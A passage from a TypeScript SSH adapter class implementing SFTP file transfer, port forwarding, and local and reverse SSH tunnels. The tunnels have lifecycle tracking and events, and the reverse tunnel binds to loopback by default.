  }

  // SFTP operations support
  async uploadFile(
    localPath: string,
    remotePath: string,
    options: SSHAdapterOptions
  ): Promise<void> {
    if (!this.sshConfig.sftp.enabled) {
      throw new AdapterError(this.adapterName, 'uploadFile', new Error('SFTP is disabled'));
    }

    const connection = await this.getConnection(options);

    await connection.ssh.putFile(localPath, remotePath);
  }

  async downloadFile(
    remotePath: string,
    localPath: string,
    options: SSHAdapterOptions
  ): Promise<void> {
    if (!this.sshConfig.sftp.enabled) {
      throw new AdapterError(this.adapterName, 'downloadFile', new Error('SFTP is disabled'));
    }

    const connection = await this.getConnection(options);

    await connection.ssh.getFile(localPath, remotePath);
  }

  async uploadDirectory(
    localPath: string,
    remotePath: string,
    options: SSHAdapterOptions
  ): Promise<void> {
    if (!this.sshConfig.sftp.enabled) {
      throw new AdapterError(this.adapterName, 'uploadDirectory', new Error('SFTP is disabled'));
    }

    const connection = await this.getConnection(options);

    await connection.ssh.putDirectory(localPath, remotePath, {
      concurrency: this.sshConfig.sftp.concurrency
    });
  }

  async portForward(
    localPort: number,
    remoteHost: string,
    remotePort: number,
    options: SSHAdapterOptions
  ): Promise<void> {
    const connection = await this.getConnection(options);

    await connection.ssh.forwardOut(
      '127.0.0.1',
      localPort,
      remoteHost,
      remotePort
    );
  }

  /**
   * Create an SSH tunnel with lifecycle management
   * @param options - Tunnel options
   * @returns SSH tunnel instance
   */
  async tunnel(options: {
    localPort?: number;
    localHost?: string;
    remoteHost: string;
    remotePort: number;
  }): Promise<{
    localPort: number;
    localHost: string;
    remoteHost: string;
    remotePort: number;
    isOpen: boolean;
    open: () => Promise<void>;
    close: () => Promise<void>;
  }> {
    // Get the last used connection from execute or create new one
    const sshOptions = this.lastUsedSSHOptions;
    if (!sshOptions) {
      throw new AdapterError(this.adapterName, 'tunnel', new Error('No SSH connection available. Execute a command first or provide connection options.'));
    }

    const connection = await this.getConnection(sshOptions);

    // Use NodeSSH's built-in createTunnel method
    const tunnelResult = await connection.ssh.createTunnel({
      localPort: options.localPort,
      localHost: options.localHost,
      remoteHost: options.remoteHost,
      remotePort: options.remotePort
    });

    // Generate ID for tracking
    const tunnelId = `${tunnelResult.localPort}-${options.remoteHost}:${options.remotePort}`;

    // Create tunnel object with proper state management
    let isOpen = true;
    const tunnel = {
      localPort: tunnelResult.localPort,
      localHost: tunnelResult.localHost,
      remoteHost: tunnelResult.remoteHost,
      remotePort: tunnelResult.remotePort,
      get isOpen() {
        return isOpen;
      },
      open: async () => {
        // Already opened when created
      },
      close: async () => {
        if (!isOpen) {
          // Already closed
          return;
        }

        isOpen = false;
        await tunnelResult.close();
        this.activeTunnels.delete(tunnelId);

        // Emit tunnel closed event
        this.emitAdapterEvent('ssh:tunnel-closed', {
          localPort: tunnelResult.localPort,
          remoteHost: options.remoteHost,
          remotePort: options.remotePort
        });
      }
    };

    // Track the tunnel
    this.activeTunnels.set(tunnelId, tunnel);

    // Emit SSH-specific tunnel created event
    this.emitAdapterEvent('ssh:tunnel-created', {
      localPort: tunnelResult.localPort,
      remoteHost: options.remoteHost,
      remotePort: options.remotePort
    });

    // Emit generic tunnel created event
    this.emitAdapterEvent('tunnel:created', {
      localPort: tunnelResult.localPort,
      remoteHost: options.remoteHost,
      remotePort: options.remotePort,
      type: 'ssh'
    });

    return tunnel;
  }

  /**
   * Open a reverse tunnel: the remote host listens, and each connection is
   * forwarded to a local address.
   *
   * This is `ssh -R`. The CLI advertised a `--reverse` flag for it while the
   * implementation threw 'not yet implemented', so the option existed only as
   * a promise.
   *
   * @param options - Remote listening address and the local destination.
   *   A `remotePort` of 0 asks the server to choose a free port, which is
   *   returned in the result.
   * @returns The bound remote port and a `close` that unbinds it.
   * @throws {AdapterError} If no SSH connection has been established yet.
   *
   * @example
   * ```typescript
   * const tunnel = await adapter.reverseTunnel({
   *   remotePort: 8080,
   *   localHost: 'localhost',
   *   localPort: 3000,
   * });
   * // Traffic to the server's :8080 now reaches localhost:3000.
   * await tunnel.close();
   * ```
   */
  async reverseTunnel(options: {
    remotePort: number;
    remoteHost?: string;
    localHost?: string;
    localPort: number;
  }): Promise<{
    remotePort: number;
    remoteHost: string;
    localHost: string;
    localPort: number;
    isOpen: boolean;
    close: () => Promise<void>;
  }> {
    const sshOptions = this.lastUsedSSHOptions;

    if (!sshOptions) {
      throw new AdapterError(
        this.adapterName,
        'reverseTunnel',
        new Error('No SSH connection available. Execute a command first or provide connection options.')
      );
    }

    const connection = await this.getConnection(sshOptions);
    // Bind on loopback by default: binding a remote listener to all
    // interfaces exposes the local service to that host's whole network,
    // which should be an explicit choice rather than a default.
    const remoteHost = options.remoteHost ?? '127.0.0.1';
    const localHost = options.localHost ?? 'localhost';

    const forwarded = await connection.ssh.forwardIn(
      remoteHost,
      options.remotePort,
      (_details, accept, reject) => {
        const channel = accept();
        const local = netConnect(options.localPort, localHost);

        local.on('connect', () => {
          channel.pipe(local).pipe(channel);
        });

        // If the local service is unreachable, close the channel rather than
        // leaving the remote caller hanging on a half-open connection.
        local.on('error', () => {
          channel.close();
        });

        channel.on('error', () => {
          local.destroy();
        });

        channel.on('close', () => {
          local.destroy();
        });

        void reject;
      }
    );

    const tunnelId = `reverse:${remoteHost}:${forwarded.port}`;
    let isOpen = true;

    const tunnel = {
      remotePort: forwarded.port,
      remoteHost,
      localHost,
      localPort: options.localPort,
      get isOpen() {
        return isOpen;
      },
      close: async () => {
        if (!isOpen) {
          return;
        }

        isOpen = false;
        await forwarded.dispose();
        this.activeTunnels.delete(tunnelId);

        this.emitAdapterEvent('ssh:tunnel-closed', {
          localPort: options.localPort,
          remoteHost,
          remotePort: forwarded.port
        });
      }
    };

    this.activeTunnels.set(tunnelId, tunnel);

    this.emitAdapterEvent('ssh:tunnel-created', {
      localPort: options.localPort,
      remoteHost,
      remotePort: forwarded.port
    });

    return tunnel;
  }

}
